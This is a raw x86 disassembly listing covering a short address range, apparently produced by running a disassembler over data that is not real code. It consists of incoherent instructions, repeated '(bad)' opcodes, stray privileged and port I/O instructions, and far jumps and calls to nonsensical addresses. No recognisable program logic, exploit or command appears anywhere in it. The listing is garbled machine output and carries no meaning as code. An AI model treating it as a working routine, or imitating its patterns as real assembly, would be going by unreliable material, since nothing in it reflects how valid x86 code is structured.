  44d05c:	js     0x44d06c
  44d05e:	jle    0x44d01a
  44d060:	and    BYTE PTR [edx],dh
  44d062:	mov    ch,0xa2
  44d064:	(bad)  
  44d065:	loopne 0x44d065
  44d067:	mov    al,0xa5
  44d069:	call   0x82955732
  44d06e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44d06f:	ins    BYTE PTR es:[edi],dx
  44d070:	lods   eax,DWORD PTR ds:[esi]
  44d071:	mov    ds:0xa4b1ca2,al
  44d076:	rol    DWORD PTR [edx+edx*8],1
  44d079:	lods   al,BYTE PTR ds:[esi]
  44d07a:	fldcw  WORD PTR [eax]
  44d07c:	imul   edx,esp,0x49bed55a
  44d082:	mov    WORD PTR [eax+eax*2-0x7ea3cf12],?
  44d089:	or     BYTE PTR [ebp-0x16],dh
  44d08c:	ret    
  44d08d:	or     bh,BYTE PTR [edi-0x39e510f6]
  44d093:	(bad)  
  44d094:	push   ds
  44d095:	clc    
  44d096:	jle    0x44d08c
  44d098:	ja     0x44d052
  44d09a:	add    al,0x91
  44d09c:	call   0x2ad3:0x76f516fd
  44d0a3:	xchg   edx,eax
  44d0a4:	mov    ebp,0x4fd0c490
  44d0a9:	mov    cl,0xc5
  44d0ab:	sub    bl,bl
  44d0ad:	pop    esi
  44d0ae:	adc    eax,0xb224163d
  44d0b3:	xor    eax,0x852460e9
  44d0b8:	mov    ch,ah
  44d0ba:	xchg   ebp,eax
  44d0bb:	ficom  DWORD PTR [edx-0x2a]
  44d0be:	sub    BYTE PTR [esi],bh
  44d0c0:	or     ah,BYTE PTR [edx]
  44d0c2:	(bad)  
  44d0c3:	mov    al,0xa
  44d0c5:	add    al,0xa
  44d0c7:	dec    ebp
  44d0c8:	out    0x51,al
  44d0ca:	ret    
  44d0cb:	cmp    dl,BYTE PTR [edx]
  44d0cd:	mov    WORD PTR [ebx+0x8],cs
  44d0d0:	or     DWORD PTR [edx+0x27469f0],eax
  44d0d6:	dec    ah
  44d0d8:	jl     0x44d106
  44d0da:	cmp    al,0x9b
  44d0dc:	push   0x3aa24796
  44d0e1:	rol    DWORD PTR [eax],1
  44d0e3:	test   eax,0x996ada39
  44d0e8:	cld    
  44d0e9:	mov    ds:0x3ea61549,eax
  44d0ee:	xchg   edx,eax
  44d0ef:	xchg   DWORD PTR [eax],edx
  44d0f1:	xor    ebp,esp
  44d0f3:	mov    eax,0xfe927ea0
  44d0f8:	xor    ecx,esp
  44d0fa:	xor    eax,0xb502f530
  44d0ff:	shl    DWORD PTR [ebx],cl
  44d101:	or     al,0x6
  44d103:	xlat   BYTE PTR ds:[ebx]
  44d104:	fmul   QWORD PTR [eax+0x96e68db]
  44d10a:	mov    dh,0x7c
  44d10c:	push   ecx
  44d10d:	jne    0x44d109
  44d10f:	and    dl,BYTE PTR [eax]
  44d111:	inc    edi
  44d112:	jnp    0x44d174
  44d114:	xor    al,0x40
  44d116:	push   edx
  44d117:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  44d119:	into   
  44d11a:	inc    ebp
  44d11b:	sub    BYTE PTR [ebp+0x7],ch
  44d11e:	mov    al,ds:0xcd9a765a
  44d123:	sar    BYTE PTR [ebx],cl
  44d125:	xor    al,0xb3
  44d127:	sbb    al,0x3
  44d129:	or     BYTE PTR [edi-0x7d73a9d3],ch
  44d12f:	cmp    BYTE PTR [edx-0x6f56f5de],al
  44d135:	pushf  
  44d136:	sub    BYTE PTR [ebp+0x36f1048f],al
  44d13c:	(bad)  
  44d13e:	sbb    BYTE PTR [ecx],bh
  44d140:	dec    edx
  44d141:	pusha  
  44d142:	lods   eax,DWORD PTR ds:[esi]
  44d143:	cmp    BYTE PTR [esi-0x7ce9fb8c],dl
  44d149:	(bad)  
  44d14a:	push   0x8e76b47c
  44d14f:	add    dl,BYTE PTR [eax+edx*2-0x561578ae]
  44d156:	sub    BYTE PTR [eax-0x1d89c130],al
  44d15c:	call   0x7e24:0xfac5cae
  44d163:	adc    DWORD PTR [edx+0x1d],eax
  44d166:	mov    esp,0x17d69194
  44d16b:	test   eax,0xd513961d
  44d170:	fdivp  st(2),st
  44d172:	fisub  DWORD PTR [ebx+0x51]
  44d175:	push   ebp
  44d176:	mov    bl,dl
  44d178:	in     al,dx
  44d179:	prefetchnta BYTE PTR [eax-0x3d]
  44d17d:	inc    ebp
  44d17e:	push   ebp
  44d17f:	dec    edi
  44d180:	add    al,0x7a
  44d182:	retf   0x11ba
  44d185:	xor    bl,BYTE PTR [ebx+0x534ab08b]
  44d18b:	inc    esp
  44d18c:	and    BYTE PTR [eax+esi*8],al
  44d18f:	das    
  44d190:	test   al,0xa8
  44d192:	push   eax
  44d193:	inc    esi
  44d194:	enter  0x36ce,0x6a
  44d198:	adc    BYTE PTR [eax],al
  44d19a:	rcr    DWORD PTR [eax],0xb0
  44d19d:	test   al,0x94
  44d19f:	fcom   DWORD PTR [ebx+eiz*1]
  44d1a2:	push   0xfee1652f
  44d1a7:	mov    ch,0x88
  44d1a9:	ins    DWORD PTR es:[edi],dx
  44d1aa:	(bad)  
  44d1ab:	hlt    
  44d1ac:	cmp    eax,0x423e1410
  44d1b1:	cwde   
  44d1b2:	pop    es
  44d1b3:	jb     0x44d1b5
  44d1b5:	xor    al,0x12
  44d1b7:	in     eax,dx
  44d1b8:	push   cs
  44d1b9:	jecxz  0x44d17f
  44d1bb:	test   DWORD PTR [esi+0x4],0x7b405f42
  44d1c2:	mov    dh,0x4f
  44d1c4:	xchg   ecx,eax
  44d1c5:	mov    fs,WORD PTR [ebp+0x411f6fb8]
  44d1cb:	ins    DWORD PTR es:[edi],dx
  44d1cc:	xor    BYTE PTR [esi-0x3f1028f2],cl
  44d1d2:	fisub  DWORD PTR [ecx]
  44d1d4:	add    DWORD PTR [eax+0x60],edi
  44d1d7:	adc    DWORD PTR [esi],ebp
  44d1d9:	push   ebx
  44d1da:	pop    ss
  44d1db:	cmp    al,0x28
  44d1dd:	mov    WORD PTR [edi],es
  44d1df:	adc    al,0x6e
  44d1e1:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44d1e3:	lea    esp,[eax]
  44d1e5:	xor    dh,ch
  44d1e7:	and    eax,0x432cb8a
  44d1ec:	pop    ebx
  44d1ed:	in     al,0x34
  44d1ef:	cli    
  44d1f0:	xor    bh,BYTE PTR [ecx+edx*2+0x4200f02e]
  44d1f7:	add    ebx,DWORD PTR [eax-0x7]
  44d1fa:	sahf   
  44d1fb:	mov    al,0x84
  44d1fd:	clc    
  44d1fe:	or     eax,0xb1ba91e1
  44d203:	push   ds
  44d204:	push   eax
  44d205:	pop    ebp
  44d206:	adc    eax,0x987e8287
  44d20b:	inc    esi
  44d20c:	xor    edi,edi
  44d20e:	clc    
  44d20f:	jmp    0x44d269
  44d211:	(bad)
  44d215:	aaa    
  44d216:	pop    esi
  44d217:	sub    ch,ah
  44d219:	aaa    
  44d21a:	pop    ds
  44d21b:	add    al,0x56
  44d21d:	pop    esp
  44d21e:	sbb    al,BYTE PTR [esi+0x2e2bc1d6]
  44d224:	sub    DWORD PTR [ebp+ebp*2-0x3b67dfb],edx
  44d22b:	scas   al,BYTE PTR es:[edi]
  44d22c:	enter  0x2582,0xc0
  44d230:	sub    BYTE PTR [eax+0x65],dh
  44d233:	adc    cl,BYTE PTR [ebp-0x6a]
  44d236:	jmp    0x206b50dd
  44d23b:	stos   BYTE PTR es:[edi],al
  44d23c:	or     ch,dh
  44d23e:	ins    BYTE PTR es:[edi],dx
  44d23f:	cld    
  44d240:	push   ecx
  44d241:	shr    BYTE PTR [eax],0x76
  44d244:	cmp    al,0x11
  44d246:	ret    0x5956
  44d249:	pop    esp
  44d24a:	lods   eax,DWORD PTR ds:[esi]
  44d24b:	pop    edx
  44d24c:	aas    
  44d24d:	iret   
  44d24e:	ins    BYTE PTR es:[edi],dx
  44d24f:	add    al,0x70
  44d251:	xchg   esi,eax
  44d252:	sahf   
  44d253:	or     al,0x15
  44d255:	retf   0x926b
  44d258:	js     0x44d29f
  44d25a:	adc    bl,BYTE PTR ds:0xe8aac85c
  44d260:	ret    0xf3d6
  44d263:	and    BYTE PTR [edx-0x24a61f24],0xa1
  44d26a:	popa   
  44d26b:	push   esp
  44d26c:	jp     0x44d1f8
  44d26e:	fisubr DWORD PTR [esi-0x52b8f0e4]
  44d274:	push   ebp
  44d275:	in     eax,dx
  44d276:	inc    ebx
  44d277:	idiv   BYTE PTR [ebx]
  44d279:	mov    ss,WORD PTR [esp+edx*2]
  44d27c:	sar    DWORD PTR [ecx],cl
  44d27e:	push   0xffffffcd
  44d280:	pop    edi
  44d281:	hlt    
  44d282:	jb     0x44d22f
  44d284:	(bad)  
  44d285:	xor    al,al
  44d287:	add    al,ch
  44d289:	jmp    0x44d28b
  44d28b:	mov    ebp,0x2999881f
  44d290:	mov    al,ds:0x45e40135
  44d295:	retf   0x8dfe
  44d298:	push   edi
  44d299:	push   esi
  44d29a:	sti    
  44d29b:	pushf  
  44d29c:	(bad)  [edx-0x70d7587e]
  44d2a2:	lock stos BYTE PTR es:[edi],al
  44d2a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44d2a5:	sbb    BYTE PTR [esi],0xaa
  44d2a8:	lds    esi,FWORD PTR [edx]
  44d2aa:	add    BYTE PTR [esi],bl
  44d2ac:	lods   al,BYTE PTR ds:[esi]
  44d2ad:	xor    ecx,DWORD PTR [ecx+0x2ee828cd]
  44d2b3:	icebp  
  44d2b4:	hlt    
  44d2b5:	mov    al,ds:0x622aa426
  44d2ba:	xchg   BYTE PTR [esi-0x32af128a],ch
  44d2c0:	ja     0x44d26a
  44d2c2:	fdivr  st(0),st
  44d2c4:	fwait
  44d2c5:	data16 add BYTE PTR [ebx-0x26a14f70],bh
  44d2cc:	ret    0xaa4b
  44d2cf:	das    
  44d2d0:	push   edi
  44d2d1:	and    al,0x40
  44d2d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44d2d4:	ret    
  44d2d5:	xchg   edx,eax
  44d2d6:	jge    0x44d278
  44d2d8:	cmp    ch,BYTE PTR [esi]
  44d2da:	xlat   BYTE PTR ds:[ebx]
  44d2db:	(bad)  
  44d2dc:	mov    esi,0xe8a2c109
  44d2e1:	js     0x44d2e8
  44d2e3:	pop    esi
  44d2e4:	fistp  WORD PTR [ebx+0x70cac160]
  44d2ea:	dec    eax
  44d2eb:	sub    cl,dh
  44d2ed:	adc    bl,dh
  44d2ef:	mov    al,ds:0x71b927c2
  44d2f4:	inc    eax
  44d2f5:	adc    DWORD PTR [eax],esp
  44d2f7:	mov    eax,esp
  44d2f9:	add    ch,BYTE PTR cs:[ebp-0x5346955e]
  44d300:	les    edx,FWORD PTR [edx+0x4b]
  44d303:	scas   al,BYTE PTR es:[edi]
  44d304:	inc    ebp
  44d305:	je     0x44d347
  44d307:	mov    dl,0xd
  44d309:	mov    fs,edx
  44d30b:	jmp    0x81e8:0xae92048b
  44d312:	and    al,0xce
  44d314:	jge    0x44d384
  44d316:	sub    BYTE PTR [eax-0x1321aad0],ch
  44d31c:	cs ret 
  44d31e:	sbb    BYTE PTR [ecx-0x28],bl
  44d321:	jbe    0x44d348
  44d323:	ins    BYTE PTR es:[edi],dx
  44d324:	loopne 0x44d2e6
  44d326:	enter  0x80d6,0xfa
  44d32a:	mov    bh,0x22
  44d32c:	cs sbb eax,0x3456004f
  44d332:	xchg   DWORD PTR [edx],edi
  44d334:	retf   0x3ccf
  44d337:	and    al,0x7e
  44d339:	pop    ecx
  44d33a:	jl     0xfa96d5bf
  44d340:	cmp    al,0x55
  44d342:	test   BYTE PTR [edx],al
  44d344:	sbb    DWORD PTR [edi],0xf3a37884
  44d34a:	adc    DWORD PTR [edx-0x1fef057d],eax
  44d350:	es es pop edx
  44d353:	sub    DWORD PTR [esi+edi*8+0x69729ab8],0x2687ac0a
  44d35e:	lock push ebx
  44d360:	into   
  44d361:	inc    edi
  44d362:	fadd   QWORD PTR [edi+edi*4+0xa4e88e8]
  44d369:	or     dh,BYTE PTR [edi]
  44d36b:	out    dx,al
  44d36c:	mov    BYTE PTR [edx-0x36],ah
  44d36f:	push   esi
  44d370:	pop    eax
  44d371:	add    al,0x6d
  44d373:	lods   al,BYTE PTR ds:[esi]
  44d374:	mov    dh,0xb6
  44d376:	sbb    eax,0x300f4406
  44d37b:	into   
  44d37c:	stos   BYTE PTR es:[edi],al
  44d37d:	sahf   
  44d37e:	int3   
  44d37f:	mov    dh,0x19
  44d381:	mov    eax,ds:0x986c134b
  44d386:	fs in  eax,dx
  44d388:	add    BYTE PTR [esi+esi*2],dl
  44d38b:	jp     0x44d332
  44d38d:	inc    esp
  44d38e:	jbe    0x44d3df
  44d390:	retf   0x7be2
  44d393:	xchg   esp,eax
  44d394:	test   BYTE PTR [esi-0x54ff7da],al
  44d39a:	aas    
  44d39b:	cmp    ch,BYTE PTR [edi]
  44d39d:	dec    ecx
  44d39e:	mov    ds:0xdeaf116a,al
  44d3a3:	xor    dl,dl
  44d3a5:	sti    
  44d3a6:	(bad)  
  44d3a7:	pop    eax
  44d3a8:	push   0x3a046532
  44d3ad:	aad    0xb
  44d3af:	cmp    BYTE PTR [esi],ah
  44d3b1:	pop    esi
  44d3b2:	test   BYTE PTR [ecx+0x2f],0x2a
  44d3b6:	pop    ecx
  44d3b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44d3b8:	mov    BYTE PTR ds:[esi],ch
  44d3bb:	push   esi
  44d3bc:	lock jmp 0xe8dd:0x6b40c2cc
  44d3c4:	jo     0x44d42a
  44d3c6:	mov    bl,0x70
  44d3c8:	push   0xc09548a2
  44d3cd:	xor    al,0xee
  44d3cf:	ins    BYTE PTR es:[edi],dx
  44d3d0:	out    0x74,al
  44d3d2:	jle    0x44d35d
  44d3d4:	cli    
  44d3d5:	and    DWORD PTR [edx-0xf],ebx
  44d3d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44d3d9:	hlt    
  44d3da:	adc    ecx,esi
  44d3dc:	adc    al,0xf1
  44d3de:	adc    BYTE PTR [esi+ebx*8],0x20
  44d3e2:	jg     0x44d3e9
  44d3e4:	lods   eax,DWORD PTR ds:[esi]
  44d3e5:	lods   eax,DWORD PTR ds:[esi]
  44d3e6:	push   edi
  44d3e7:	cmp    BYTE PTR [esi],0xda
  44d3ea:	push   0x580b1e02
  44d3ef:	or     ah,BYTE PTR [edi]
  44d3f1:	rol    BYTE PTR [esi-0x70ff8173],cl
  44d3f7:	or     BYTE PTR [edi+0x7cdd197a],0x6d
  44d3fe:	ja     0x44d450
  44d400:	jmp    0xc61b:0x48948150
  44d407:	sbb    BYTE PTR [edx-0x61],0xa8
  44d40b:	in     eax,dx
  44d40c:	jo     0x44d47c
  44d40e:	push   ss
  44d40f:	mov    ebp,0x4e1c06cd
  44d414:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44d415:	add    eax,0xcfd0ea54
  44d41a:	(bad)  
  44d41b:	repnz cwde 
  44d41d:	mov    cl,0xb5
  44d41f:	das    
  44d420:	loop   0x44d3c9
  44d422:	test   ah,dl
  44d424:	cmp    al,0x3a
  44d426:	loopne 0x44d3c2
  44d428:	(bad)  
  44d429:	mov    ds:0x37ecdad0,al
  44d42e:	ins    BYTE PTR es:[edi],dx
  44d42f:	pop    eax
  44d430:	sub    DWORD PTR [esi+0x416bbd4c],esp
  44d436:	jl     0x44d3ba
  44d438:	lock mov edi,?
  44d43b:	mov    ah,0x36
  44d43d:	adc    bl,al
  44d43f:	inc    ebp
  44d440:	and    edx,0x3fc40a27
  44d446:	push   ss
  44d447:	nop
  44d448:	call   0xe668:0x657a9fb8
  44d44f:	cld    
  44d450:	into   
  44d451:	test   DWORD PTR [ebx-0x3c],ebp
  44d454:	pop    eax
  44d455:	add    cl,BYTE PTR [edx]
  44d457:	dec    edx
  44d458:	add    dh,dh
  44d45a:	push   es
  44d45b:	xchg   ebx,eax
  44d45c:	push   esp
  44d45d:	adc    ecx,DWORD PTR [eax-0x12]
  44d460:	call   0xf295:0x5a3994e4
  44d467:	shl    BYTE PTR [eax-0x2163a99c],0x50
  44d46e:	test   al,0xb0
  44d470:	push   esi
  44d471:	push   cs
  44d472:	mov    al,0xf2
  44d474:	push   es
  44d475:	outs   dx,DWORD PTR ds:[esi]
  44d476:	dec    edx
  44d477:	jo     0x44d41b
  44d479:	jmp    0x44d4cd
  44d47b:	cs inc eax
  44d47d:	daa    
  44d47e:	add    dl,BYTE PTR [esi+0x4c]
  44d481:	ds sbb al,al
  44d484:	mov    cs,WORD PTR [edi+0x36]
  44d487:	sub    eax,0xd52ab87c
  44d48c:	adc    dl,BYTE PTR ds:0x15ba1247
  44d492:	xchg   esp,eax
  44d493:	mov    al,0xae
  44d495:	gs ins BYTE PTR es:[edi],dx
  44d497:	inc    edx
  44d498:	push   es
  44d499:	(bad)  
  44d49a:	out    dx,eax
  44d49b:	mov    ah,0x9c
  44d49d:	fs int 0x9b
  44d4a0:	pop    eax
  44d4a1:	fdivr  DWORD PTR [esi+0x587c9ca0]
  44d4a7:	sahf   
  44d4a8:	add    BYTE PTR [ebx+0x3c],bl
  44d4ab:	out    dx,al
  44d4ac:	adc    al,bh
  44d4ae:	sub    DWORD PTR [ecx],ecx
  44d4b0:	add    BYTE PTR [edx],0x67
  44d4b3:	mov    dh,0x35
  44d4b5:	mov    ch,0x47
  44d4b7:	mov    al,0xb6
  44d4b9:	cs lahf 
  44d4bb:	mov    esi,0xd12b9469
  44d4c0:	fmul   QWORD PTR [eax-0x1e]
  44d4c3:	mov    ds:0x4d30a1a9,eax
  44d4c8:	add    eax,0xf61b150
  44d4cd:	cs ins DWORD PTR es:[edi],dx
  44d4cf:	jmp    0x44d547
  44d4d1:	ds add DWORD PTR ss:[eax-0x4ae9fe0a],esp
  44d4d9:	call   FWORD PTR [edx+0x6d78261b]
  44d4df:	arpl   cx,dx
  44d4e1:	shl    DWORD PTR [eax],0xa8
  44d4e4:	push   esp
  44d4e5:	mov    ss,WORD PTR [esi+edi*2-0x3cf44bab]
  44d4ec:	loopne 0x44d542
  44d4ee:	out    dx,al
  44d4ef:	call   0x5176fb6a
  44d4f4:	push   esp
  44d4f5:	add    BYTE PTR [esi+eax*4-0x60f479fe],dl
  44d4fc:	add    al,0x7c
  44d4fe:	push   esi
  44d4ff:	sti    
  44d500:	gs (bad) 
  44d503:	mov    dh,0xb3
  44d505:	xchg   DWORD PTR [eax+esi*8],esp
  44d508:	pushf  
  44d509:	das    
  44d50a:	or     DWORD PTR [edi+edi*2+0x62],0x34
  44d50f:	and    BYTE PTR [eax+0x2d6d4927],0x78
  44d516:	lods   al,BYTE PTR ds:[esi]
  44d517:	sub    edx,eax
  44d519:	cmc    
  44d51a:	mov    al,BYTE PTR ds:0x52083735
  44d520:	in     al,dx
  44d521:	adc    ah,bl
  44d523:	sbb    ebp,DWORD PTR [edx-0x29]
  44d526:	mov    al,0xea
  44d528:	push   edi
  44d529:	call   0x8ea0:0x1748272
  44d530:	mov    al,ds:0xa26a988
  44d535:	and    BYTE PTR [ebx],ch
  44d537:	mov    ah,0x46
  44d539:	xchg   esp,eax
  44d53a:	hlt    
  44d53b:	popa   
  44d53c:	test   DWORD PTR [esi-0x7b],esi
  44d53f:	iret   
  44d540:	jb     0x44d590
  44d542:	mov    ebp,0x7510a6a6
  44d547:	pusha  
  44d548:	sti    
  44d549:	inc    edx
  44d54a:	xor    eax,0xacbaf39a
  44d54f:	inc    esi
  44d550:	dec    edi
  44d551:	xor    al,0x7c
  44d553:	sar    edx,0x20
  44d556:	inc    eax
  44d557:	pop    edi
  44d558:	push   ds
  44d559:	mov    BYTE PTR [esi+0x54],bl
  44d55c:	sar    DWORD PTR [edx+0x54],0xd6
  44d560:	rcr    DWORD PTR [eax],cl
  44d562:	mov    dh,0xd5
  44d564:	pop    ecx
  44d565:	fist   DWORD PTR [ebx]
  44d567:	dec    eax
  44d568:	cmp    al,BYTE PTR ds:0x33e3837c
  44d56e:	test   al,0x45
  44d570:	ret    0xb462
  44d573:	push   ss
  44d574:	and    edi,DWORD PTR [eax]
  44d576:	mov    dh,0x6f
  44d578:	imul   eax,ebp,0x8bf2a688
  44d57e:	cld    
  44d57f:	les    ecx,FWORD PTR [edx]
  44d581:	mov    esp,0x875da5ee
  44d586:	mov    dh,0x60
  44d588:	pusha  
  44d589:	mov    esp,0xd8195ab4
  44d58e:	sub    ch,BYTE PTR [esi+0xb7c64ac]
  44d594:	xchg   esp,eax
  44d595:	popa   
  44d596:	cmp    bl,BYTE PTR ds:0x61634242
  44d59c:	scas   al,BYTE PTR es:[edi]
  44d59d:	mov    ds:0x927b68fa,al
  44d5a2:	mov    al,0xbe
  44d5a4:	outs   dx,BYTE PTR ds:[esi]
  44d5a5:	lds    ebp,FWORD PTR [edx+0x70069445]
  44d5ab:	add    al,0xb5
  44d5ad:	stos   DWORD PTR es:[edi],eax
  44d5ae:	and    edx,DWORD PTR [ecx+edi*1+0x36]
  44d5b2:	sbb    al,0x10
  44d5b4:	test   esi,eax
  44d5b6:	das    
  44d5b7:	add    bl,BYTE PTR [edi]
  44d5b9:	xchg   esi,eax
  44d5ba:	cwde   
  44d5bb:	std    
  44d5bc:	push   esp
  44d5bd:	inc    ebx
  44d5be:	je     0x44d545
  44d5c0:	lods   eax,DWORD PTR ds:[esi]
  44d5c1:	loope  0x44d59e
  44d5c3:	add    BYTE PTR [edi+0x5c],bl
  44d5c6:	add    al,0x9a
  44d5c8:	(bad)  
  44d5c9:	dec    eax
  44d5ca:	dec    ecx
  44d5cb:	inc    ebp
  44d5cc:	cli    
  44d5cd:	add    al,0xe
  44d5cf:	shl    BYTE PTR [edi+ebx*1+0x61],0x3b
  44d5d4:	mov    BYTE PTR [edi],0xa4
  44d5d7:	aas    
  44d5d8:	sub    dh,BYTE PTR [esi-0x16]
  44d5db:	push   edx
  44d5dc:	xchg   edx,eax
  44d5dd:	push   esi
  44d5de:	rol    cl,1
  44d5e0:	cli    
  44d5e1:	inc    ebp
  44d5e2:	pop    esp
  44d5e3:	pop    eax
  44d5e4:	imul   edx,DWORD PTR [esi+0x2c4417db],0x6cac17a8
  44d5ee:	push   ebx
  44d5ef:	jo     0x44d5c8
  44d5f1:	mov    ch,0xa3
  44d5f3:	mov    BYTE PTR [edi+0x1a],al
  44d5f6:	jl     0x44d632
  44d5f8:	fiadd  WORD PTR [eax]
  44d5fa:	adc    bl,BYTE PTR [ebx-0x74d979fa]
  44d600:	inc    ebx
  44d601:	(bad)  
  44d602:	and    DWORD PTR [eax+esi*2],edx
  44d605:	dec    esi
  44d606:	jl     0x44d5ec
  44d608:	cld    
  44d609:	pop    esi
  44d60a:	cli    
  44d60b:	mov    ds:0xc7c0cb5e,al
  44d610:	sub    al,0x22
  44d612:	fsub   DWORD PTR [eax+0x382c448e]
  44d618:	jl     0x44d5ec
  44d61a:	or     al,0xb4
  44d61c:	shl    BYTE PTR [eax],cl
  44d61e:	pop    ebx
  44d61f:	aad    0x92
  44d621:	(bad)  
  44d623:	retf   0x8abe
  44d626:	pop    ecx
  44d627:	rol    DWORD PTR [esi+ebx*8],1
  44d62a:	shl    BYTE PTR [edx-0x7675a4bd],0x8c
  44d631:	and    esi,DWORD PTR [eax-0x8]
  44d634:	xor    ah,0x1
  44d637:	and    BYTE PTR [eax],dh
  44d639:	int3   
  44d63a:	dec    esp
  44d63b:	(bad)  
  44d63c:	xchg   edi,eax
  44d63d:	test   DWORD PTR [edi+0x401e6652],eax
  44d643:	xchg   edi,eax
  44d644:	lock mov dl,BYTE PTR [esi+0x7b]
  44d648:	mov    ah,BYTE PTR [edx+edx*8+0x3c29b06]
  44d64f:	jecxz  0x44d667
  44d651:	mov    cl,0xb0
  44d653:	call   0xb4790ebe
  44d658:	call   0x73d6e56f
  44d65d:	xchg   ecx,eax
  44d65e:	and    al,0xd
  44d660:	inc    ebx
  44d661:	inc    ecx
  44d662:	sbb    ecx,DWORD PTR [esi+eiz*8-0x68]
  44d666:	daa    
  44d667:	aad    0xe6
  44d669:	(bad)  
  44d66a:	scas   al,BYTE PTR es:[edi]
  44d66b:	mov    ds:0xd97edd82,al
  44d670:	adc    al,0xdb
  44d672:	pop    esp
  44d673:	addr16 or dl,ch
  44d676:	adc    al,0x36
  44d678:	pop    es
  44d679:	add    BYTE PTR [esi+0x52177bb8],ch
  44d67f:	das    
  44d680:	dec    ebp
  44d681:	cld    
  44d682:	add    BYTE PTR [ecx],0x5c
  44d685:	xor    BYTE PTR [edi+0x71],al
  44d688:	jge    0x44d6d5
  44d68a:	shl    BYTE PTR [edi],0x14
  44d68d:	stos   DWORD PTR es:[edi],eax
  44d68e:	stos   DWORD PTR es:[edi],eax
  44d68f:	push   0x44c84c50
  44d694:	mov    ds:0x1338cbb2,eax
  44d699:	push   0xe
  44d69b:	dec    edx
  44d69c:	dec    esi
  44d69d:	push   eax
  44d69e:	mov    dl,0x33
  44d6a0:	jmp    0xfc5917aa
  44d6a5:	mov    dh,0x28
  44d6a7:	pop    es
  44d6a8:	out    0x44,al
  44d6aa:	mov    ah,0x86
  44d6ac:	sub    eax,eax
  44d6ae:	mov    cs,eax
  44d6b0:	cld    
  44d6b1:	cs sub al,0x10
  44d6b4:	js     0x44d706
  44d6b6:	dec    ebx
  44d6b7:	push   cs
  44d6b8:	hlt    
  44d6b9:	push   0x4c0acd57
  44d6be:	pop    eax
  44d6bf:	imul   edi,DWORD PTR [edx],0x63763a76
  44d6c5:	jmp    0xb8e2:0x18b40d37
  44d6cc:	out    0x2b,al
  44d6ce:	push   esi
  44d6cf:	push   0xe4d60af6
  44d6d4:	aam    0xa5
  44d6d6:	sahf   
  44d6d7:	mov    esi,0xab25b21c
  44d6dc:	xor    eax,0xe24faa88
  44d6e1:	pop    edi
  44d6e2:	mov    al,ds:0x12f8023e
  44d6e7:	repnz mov esi,0x276d0a48
  44d6ed:	test   al,0x55
  44d6ef:	iret   
  44d6f0:	out    0x8a,al
  44d6f2:	push   esp
  44d6f3:	inc    eax
  44d6f4:	int3   
  44d6f5:	pop    esi
  44d6f6:	mov    edi,0x2db342c
  44d6fb:	push   ss
  44d6fc:	add    al,0x1f
  44d6fe:	ror    BYTE PTR [edx],0x3c
  44d701:	popf   
  44d702:	add    BYTE PTR [eax-0x73719a5c],ch
  44d708:	into   
  44d709:	xor    eax,DWORD PTR [edx+eax*4+0x42f3c62f]
  44d710:	cmp    BYTE PTR [eax+0x54178401],bh
  44d716:	rcl    BYTE PTR [eax-0x4e37b1af],0x94
  44d71d:	mov    ds:0xd6343eda,al
  44d722:	pop    esi
  44d723:	jle    0x44d6db
  44d725:	test   BYTE PTR [edi+0x44],cl
  44d728:	shl    BYTE PTR [esi+0xd],1
  44d72b:	clc    
  44d72c:	popa   
  44d72d:	scas   eax,DWORD PTR es:[edi]
  44d72e:	gs mov ebp,0x86cc081e
  44d734:	ss imul edx,eax,0xa5360487
  44d73b:	mov    eax,0x685adfb8
  44d740:	ret    
  44d741:	test   BYTE PTR [ecx-0x57],0xb5
  44d745:	outs   dx,BYTE PTR ds:[esi]
  44d746:	mov    BYTE PTR [eax-0x2a],bh
  44d749:	outs   dx,DWORD PTR ds:[esi]
  44d74a:	mov    al,0xd4
  44d74c:	les    esp,FWORD PTR [eax+0x53c0cf0d]
  44d752:	xchg   esp,eax
  44d753:	mov    ebx,DWORD PTR cs:[edx]
  44d756:	popa   
  44d757:	cmp    esi,eax
  44d759:	or     ebx,ebp
  44d75b:	adc    edx,esp
  44d75d:	mov    ebx,0x22a9b47c
  44d762:	icebp  
  44d763:	mov    ebx,DWORD PTR [eax-0x4]
  44d766:	sub    cl,BYTE PTR [edi-0x8]
  44d769:	push   0x88f5142
  44d76e:	cmp    eax,0xa4c1b5c4
  44d773:	and    eax,0xc0ce049d
  44d778:	pop    es
  44d779:	cli    
  44d77a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44d77b:	call   0xd0c6378a
  44d780:	push   0x20
  44d782:	pop    esi
  44d783:	je     0x44d733
  44d785:	jmp    0xc265:0xf68acc92
  44d78c:	jle    0x44d7d4
  44d78e:	jge    0x44d77e
  44d790:	in     eax,dx
  44d791:	mov    edi,0xb500b86
  44d796:	dec    esi
  44d797:	pop    esp
  44d798:	cs jo  0x44d7f2
  44d79b:	into   
  44d79c:	jecxz  0x44d7b6
  44d79e:	rol    BYTE PTR [esi-0x270d5578],0x24
  44d7a5:	shl    BYTE PTR [edx],1
  44d7a7:	push   eax
  44d7a8:	dec    eax
  44d7a9:	mov    ds:0x5b869818,eax
  44d7ae:	test   eax,0x9c3a5b15
  44d7b3:	sti    
  44d7b4:	cmp    cl,BYTE PTR [ecx-0x12]
  44d7b7:	pusha  
  44d7b8:	shr    BYTE PTR [edx],1
  44d7ba:	jo     0x44d808
  44d7bc:	sahf   
  44d7bd:	cli    
  44d7be:	clc    
  44d7bf:	mov    cl,0x10
  44d7c1:	xchg   ebp,eax
  44d7c2:	cdq    
  44d7c3:	pop    eax
  44d7c4:	mov    eax,ds:0x279a8a05
  44d7c9:	fnstenv [ecx+0x67db510]
  44d7cf:	in     al,0x40
  44d7d1:	push   ds
  44d7d2:	fisttp DWORD PTR [esi+0xa]
  44d7d5:	sub    BYTE PTR [edx],dl
  44d7d7:	mov    edx,0x4ba28ca0
  44d7dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  44d7dd:	dec    ebp
  44d7de:	push   es
  44d7df:	jmp    0x44d785
  44d7e1:	mov    ds:0x7bbc5ede,eax
  44d7e6:	and    DWORD PTR [ebx+0x52e47034],ebp
  44d7ec:	ret    0xe27e
  44d7ef:	adc    eax,0x347eca2c
